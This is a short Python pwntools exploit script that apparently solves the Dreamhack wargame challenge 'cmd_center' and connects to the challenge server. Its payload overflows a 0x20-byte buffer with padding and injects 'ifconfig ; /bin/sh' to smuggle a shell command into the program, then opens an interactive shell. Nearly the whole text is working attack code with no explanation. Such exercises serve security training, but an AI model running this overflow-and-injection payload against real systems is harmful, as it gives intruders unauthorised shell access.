from pwn import *
# p = process("./cmd_center")
p = connect("host3.dreamhack.games", 18336)


p.recvuntil("Center name: ")
payload = b"A" * 0x20 + b"ifconfig ; /bin/sh"

p.sendline(payload)
p.interactive()
